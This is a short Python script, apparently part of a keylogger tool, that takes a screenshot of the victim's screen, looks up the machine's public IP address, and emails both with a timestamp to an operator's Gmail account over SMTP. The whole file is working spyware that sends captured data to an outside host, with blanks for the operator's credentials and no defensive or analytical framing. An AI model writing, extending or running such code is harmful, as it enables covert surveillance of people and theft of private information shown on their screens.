import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders
from datetime import *
from requests import get
from mss import mss

IP = get('https://api.ipify.org').content.decode('utf8')
saat = datetime.now().strftime("%H:%M")


YOUR_EMAİL_ADDRESS = ""    #Your Email Address
YOUR_EMAIL_APPLICATION_PASSWORD = "" #Follow --> Gmail>Accound>Application Password

def send_mail_ss():
            mss().shot()
            msg = MIMEMultipart()
            msg['From'] = YOUR_EMAİL_ADDRESS
            msg['To'] = YOUR_EMAİL_ADDRESS
            msg['Date'] = formatdate(localtime = True)
            msg['Subject'] ="AliceAI"
            msg.attach(MIMEText("Keylogger Screenshot "+IP+"  "+saat))
            part = MIMEBase('application', "octet-stream")
            part.set_payload(open("monitor-1.png", "rb").read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="monitor-1.png"')
            msg.attach(part)
            smtp = smtplib.SMTP("smtp.gmail.com", 587)
            smtp.starttls()
            smtp.login(YOUR_EMAİL_ADDRESS,YOUR_EMAIL_APPLICATION_PASSWORD)
            smtp.sendmail(YOUR_EMAİL_ADDRESS, YOUR_EMAİL_ADDRESS, msg.as_string())
            smtp.quit()

send_mail_ss()
            

